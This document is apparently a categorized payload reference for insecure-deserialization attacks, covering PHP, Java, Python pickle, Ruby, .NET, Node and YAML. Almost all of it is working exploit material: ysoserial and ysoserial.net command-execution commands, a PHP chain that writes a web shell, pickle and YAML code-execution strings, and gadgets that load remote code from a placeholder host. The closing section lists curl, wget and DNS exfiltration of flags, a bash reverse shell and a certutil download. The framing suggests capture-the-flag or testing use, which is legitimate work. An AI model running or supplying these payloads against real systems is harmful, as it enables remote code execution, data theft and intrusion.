# Payload Dictionary — the categorized corpus

## Detection probes — confirm the sink without a gadget

### Corrupted-grammar probes (per format)

```
PHP    O:8:"User":2:{s:4:"name";s:5:"admin";      ← unbalanced brace
       s:999:"x";                                 ← length lie
Java   aced0005 + flip one byte in classdesc
       rO0ABXN... truncated mid-stream
pickle \x80\x03c                ← truncated after GLOBAL
       \x80\x03(                ← MARK never closed
Marshal \x04\x08\xff            ← bad type tag
.NET   AAEAAAD///// + corrupt tail
       __VIEWSTATE with one char flipped
YAML   !!python/object:does.not.Exist {x:1}
       !ruby/object:Does::Not::Exist
Json   {"$type":"Does.Not.Exist, X"}
       {"__type":"Does.Not.Exist"}
node   {"x":"_$$ND_FUNC$$_function(){"}   ← unclosed fn
```

### Benign marker probes

```bash
python3 tools/pickle_gen.py --marker X1       # PWNED_X1 object
java -jar ysoserial.jar URLDNS http://x.YOU/  # DNS callback
python3 tools/php_ser_gen.py --spec '{"O":"stdClass","props":{"pwned":"X1"}}'
```

### Probe-class probes (name a class that can't exist)

```
Java:   com.attacker.ProbeDoesNotExist   → ClassNotFoundException
PHP:    O:8:"AttackerProbe":0:{}          → __PHP_Incomplete_Class
pickle: cattacker.probe\nProbe\n          → UnpicklingError / Can't get attr
Ruby:   !ruby/object:Attacker::Probe      → DisallowedClass / const error
.NET:   {"$type":"Attacker.Probe, X"}     → JsonException naming it
```

## PHP — the per-purpose payload library

### Marker / confirm

```
O:8:"stdClass":1:{s:5:"pwned";s:2:"X1";}
a:1:{i:0;O:8:"stdClass":1:{s:1:"x";s:1:"1";}}
```

### POP skeletons (assemble per app's classes)

```php
// file-write sink — Logger/FileHandler pattern
O:6:"Logger":1:{s:10:"\0*\0handler";O:11:"FileHandler":2:{s:6:"\0*\0file";s:12:"/tmp/shell.php";s:6:"\0*\0data";s:29:"<?php system($_GET['c']);?>";}}

// __toString pivot — an object used as a string
O:5:"Outer":1:{s:3:"inn";O:5:"Inner":1:{s:4:"call";s:6:"system";}}

// eval via assert in a call chain
O:3:"Evk":1:{s:4:"call";s:6:"assert";s:4:"args";s:16:"system('id');";}
```

### phar:// metadata (see phar-deser.md)

```bash
python3 tools/php_ser_gen.py --spec '{...pop...}' >meta.ser
python3 tools/web/archive_gen.py phar --metadata "$(cat meta.ser)" >x.jpg
```

### `S:` escaped-string for mangle bypass

```
S:5:"\00\00\00\00\00";            ← 5 NULs, no literal NUL in stream
S:8:"\27\5c\22\3b\3a\4f\3a\30";  ← quotes/slashes/colons escaped
php_ser_gen.py --str 'payload' --str-type S
```

## Java — the ysoserial command library

```bash
# detection
java -jar ysoserial.jar URLDNS 'http://x.YOU/'

# RCE — pick per classpath
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'bash -c id'
java -jar ysoserial.jar CommonsCollections6 'curl http://YOU/`id|base64`'
java -jar ysoserial.jar CommonsBeanutils1 'id'
java -jar ysoserial.jar Groovy1 'id'
java -jar ysoserial.jar Jdk7u21 'id'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Hibernate1 'id'

# non-RCE impacts
java -jar ysoserial.jar AspectJWeaver 'file.txt' '<?=`id`?>'   # file write
java -jar ysoserial.jar FileUpload1 'write' '/tmp/x' 'data'
java -jar ysoserial.jar JRMPClient 'YOU:1099'                  # 2-stage

# the JNDI-sink gadgets (JDK-only)
java -jar ysoserial.jar C3P0 'http://YOU/Exploit'
# JdbcRowSetImpl via fastjson/xstream — see below
```

### Fastjson @type

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://YOU/Exploit","autoCommit":true}
{"@type":"org.apache.commons.collections.functors.ChainedTransformer",...}
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;",...}    // 1.2.24-47 bypass
{"@type":"com.sun.rowset.JdbcRowSetImpl","@type":"x"}  // dup-key bypass
```

### XStream dynamic-proxy

```xml
<sorted-set>
  <string>x</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>id</string></command>
      </target><action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

### XMLDecoder bean

```xml
<java><object class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void></array>
<void method="start"/></object></java>
```

## Python — the __reduce__ corpus

```python
# os.system RCE
(os.system, ('id',))
(nt.system, ('id',))                     # windows
(posix.system, ('id',))                  # posix

# eval/exec
(eval, ("__import__('os').popen('id').read()",))
(exec, ("import os;os.system('id')",))

# subprocess — captured output
(__import__('subprocess').check_output, (['id'],))
(__import__('subprocess').getoutput, ('id',))

# builtins-only filter bypass
(eval, ("1",))
(getattr, (__import__('os'), 'system'))
(__import__, ('os',))
```

### Hand-crafted pickle strings

```
cnt\nsystem\n(S'id'\ntR.                        p0 os.system
cposix\nsystem\nq\x00X\x02\x00\x00\x00id\x85q\x01Rq\x02.   p3-ish
cbuiltins\neval\n(S'__import__("os").system("id")'\ntR.
cbuiltins\nexec\n(S'import os;os.system("id")'\ntR.
cos\nsystem\n(S'curl http://YOU/`id|base64`'\ntR.
```

## Ruby — the gadget skeletons

### Marshal universal-ERB shape

```ruby
# the proxy graph — ActiveSupport::Deprecation → ERB src eval
# (see ruby-deser.md for the version-split variants)
```

### Psych YAML

```yaml
--- !ruby/object:ERB
src: "<%= `id` %>"
--- !ruby/object:Gem::Requirement
requirements: [!ruby/object:Gem::Package::TarReader {io: ...}]
```

## .NET — ysoserial.net command library

```bash
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c id' -o base64
ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c 'cmd /c id'
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c 'cmd /c id' -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c 'cmd /c id'

# Json.NET
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'cmd /c id' -o base64
ysoserial.exe -g WindowsClaimsIdentity -f Json.Net -c 'cmd /c id'
ysoserial.exe -g PSObject -f Json.Net -c 'powershell -enc <b64>'

# SoapFormatter / NetDataContractSerializer / Xaml / LosFormatter
ysoserial.exe -g TextFormattingRunProperties -f SoapFormatter -c 'cmd /c id'
ysoserial.exe -g TypeConfuseDelegate -f NetDataContractSerializer -c 'id'
ysoserial.exe -g ObjectDataProvider -f Xaml -c 'cmd /c id'
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c 'cmd /c id'
```

### Json.NET ObjectDataProvider

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList",
                     "$values":["cmd","/c calc"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

### ViewState

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg=SHA1 --validationkey=HEX \
  --decryptionalg=AES --decryptionkey=HEX \
  --generator=GENHEX --path=/x.aspx --apppath=/ -c 'cmd /c id'
```

## Node — the revive strings

```json
{"x":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup('x.YOU')}()"}
{"x":"_$$ND_FUNC$$_function(){var c=require('child_process');c.exec('curl http://YOU/`id|base64 -w0`')}()"}
```

```yaml
fn: !!js/function 'function(){return require("child_process").execSync("id")}'
```

## YAML — the cross-language tag corpus

```yaml
# PyYAML unsafe
!!python/object:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
!!python/object/apply:eval ["__import__('os').popen('id').read()"]
!!python/name:os.system

# Snakeyaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://YOU/x.jar"]]]]
!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://YOU/x", autoCommit: true}

# Psych
!ruby/object:ERB {src: "<%= `id` %>"}
!ruby/object:Gem::Installer {i: x}

# js-yaml ≤3
!!js/function 'function(){require("child_process").execSync("id")}'
```

## The flag-exfil suffixes — per-shell

```bash
id                                                # basic
cat /flag  cat /flag.txt  cat flag.txt            # common paths
env | grep -i flag                                 # FLAG env var
curl http://YOU/`cat /flag|base64 -w0`            # OOB exfil
curl http://YOU/`id|base64|tr -d '\n'`            # OOB RCE proof
wget --post-data="$(id)" http://YOU/x             # OOB via POST
nslookup `id|base64|tr -d '\n'`.YOU               # DNS exfil
bash -c 'bash -i >& /dev/tcp/YOU/4444 0>&1'       # reverse shell
powershell -enc <b64>                              # Windows
certutil -urlcache -split -f http://YOU/x c:/x    # Windows exfil
```
